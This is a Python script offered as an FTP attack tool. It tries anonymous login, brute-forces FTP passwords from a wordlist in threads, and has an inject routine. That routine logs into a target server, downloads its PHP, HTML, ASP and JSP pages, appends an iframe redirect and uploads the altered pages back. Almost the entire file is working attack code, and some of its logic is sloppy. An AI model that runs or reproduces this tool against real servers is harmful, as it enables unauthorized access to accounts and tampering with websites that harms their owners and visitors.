#!/usr/bin/python3
import ftplib
import os
import sys
from threading import Thread,ThreadError
from time import sleep
"""      If we Know The username and password of target       """
def inject(hostname,username,password,redirect):
    try:
        ftp = ftplib.FTP(hostname)  
        ftp.login(username,password)
        files = ftp.nlst()
        for file in files:
            if (".php" in file) or (".htm" in file) or (".asp" in file) or (".jsp" in file):
                print(file)
                try:
                    f = open(file,"w")
                    ftp.retrlines("RETR {}".format(file),f.write)
                    print("Downloaded {}".format(file))
                    f.write(redirect)
                    f.close()
                    g = open(file,"rb")
                    ftp.storlines("STOR {}".format(file),g)
                    print("Upload Successfull: {}".format(file))
                    ftp.quit()

                except Exception as error:
                    print("Error: {} ".format(error))

    except Exception as e:
        print("Error Occurred: {}".format(e))

def bruteForce_password(ftp,username,password):
    global login
    try:
        ftp.login(username,password)
        print("We Founded the Credentials: {}/{}".format(username,password))
        login = True
        sys.exit()
    except:
        pass


def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous","mail@you.com")
        print("Anonmous Login Succeeded")
        ftp.quit()
        return True

    except Exception as e:
        print("Anonymous Login Failed: {}".format(e))
        return False

def bruteLogin(hostname,passFile):
    print("Please make sure that password file contains username and password in this form:- username:password")
    with open(passFile,"r") as f:
        for line in f.readlines():
            username = line.split(":")[0]
            password = line.split(":")[1].strip('\r').strip('\n')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username,password)
                print("Login Success using {}:{}".format(username,password))
                ftp.quit()
                sys.exit()
            except:
                pass
    print("Could not resolve credentials")

if __name__ == "__main__":
    login = False
    host = input("Enter Target <IP or Hostname> : ")
    username = input("Enter Username : ")
    redirect = "<iframe src='https://google.com' frameborder='0'></iframe>"
    passFile = input("Enter wordlist: ")
    print("We are Finding The Password")
    try:
        ftp = ftplib.FTP(host)
        with open(passFile,"r") as f:
            for password in f.readlines():
                password = password.strip('\n')
                # print("[-] Testing {}/{}".format(username,password))
                threader = Thread(target=bruteForce_password,args=(ftp,username,password))
                threader.start()
                if ThreadError:
                    sleep(0.04)
                if login == True:
                    sys.exit()

    except Exception as e:
        print("Error Occured: {}".format(e))
        sys.exit()